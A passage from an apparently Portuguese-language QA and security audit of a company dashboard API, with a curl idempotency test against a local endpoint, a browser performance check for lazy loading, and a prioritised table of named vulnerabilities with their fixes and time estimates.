USER_TOKEN="eyJ..."

# TESTE 1: Dupla request com idempotency_key
echo "[TEST 4.4.1] Double click - same idempotency_key"

IDEMPOTENCY_KEY=$(openssl rand -hex 16)

# Request 1
curl -s -X POST \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "company": { "name": "Nova Empresa" },
    "idempotency_key": "'$IDEMPOTENCY_KEY'"
  }' \
  "https://api.avaliasolar.local/api/v1/company_dashboard/update_info" \
  | jq .

# Resposta: 201 Created + pending_change_id=1000

# Request 2 (imediatamente)
curl -s -X POST \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "company": { "name": "Nova Empresa" },
    "idempotency_key": "'$IDEMPOTENCY_KEY'"
  }' \
  "https://api.avaliasolar.local/api/v1/company_dashboard/update_info" \
  | jq .

# Esperado ANTES: 201 Created + pending_change_id=1001 (DUPLICATA)
# Esperado DEPOIS: 200 OK + cached: true + pending_change_id=1000 (mesma resposta)

# VERIFICAR DB:
# SELECT COUNT(*) FROM pending_changes WHERE idempotency_key = '$IDEMPOTENCY_KEY'
# Esperado: 1 (não 2)
```

---

### Teste 4.5: Verificar Lazy Loading Frontend

```javascript
// Browser DevTools Console

// TESTE 1: Verificar se todos os endpoints são chamados no mount
performance.mark('dashboard_mount_start');

// Navegar para dashboard
window.location.href = '/company-dashboard';

// Aguardar 3 segundos
setTimeout(() => {
  // Verificar Network tab
  const requests = performance.getEntriesByType('resource')
    .filter(r => r.name.includes('/api/v1/company_dashboard'));
  
  console.table(requests.map(r => ({
    name: r.name.split('/').pop(),
    duration: r.duration.toFixed(0) + 'ms'
  })));
}, 3000);

// TESTE 2: Lazy load verificação
// Clicar em cada aba
// Monitorar network: apenas o endpoint dessa aba deve ser chamado
// Não chamar todos os 15+ endpoints
```

---

## RESUMO EXECUTIVO - AÇÕES IMEDIATAS

| Prioridade | Vulnerabilidade | Fix | Tempo | Impacto |
|---|---|---|---|---|
| 🔴 P0 | IDOR em set_company | Adicionar validação de membros ativos | 2h | Bloqueia data breach |
| 🔴 P0 | Sem feature gating em analytics | Backend enforcer policies | 4h | Bloqueia data leak premium |
| 🔴 P0 | Feature gates frontend-only | Mover para backend authorization | 2h | Elimina bypass |
| 🟡 P1 | N+1 em intent_summary | Eager load + batch queries | 3h | -80% response time |
| 🟡 P1 | Race condition pending_changes | Adicionar idempotency_key | 3h | Elimina duplicatas |
| 🟢 P2 | JWT em localStorage | Mover para HttpOnly cookies | 1h | Reduz XSS risk |

**Total:** 15 horas de desenvolvimento  
**Teste:** 5 horas  
**Deployment:** 2 horas (com rollback plan)

---

**Documento criado por:** QA & Security Auditor  
**Timestamp:** 2026-05-26T04:33:01.498Z  
**Status:** Pronto para Implementation  
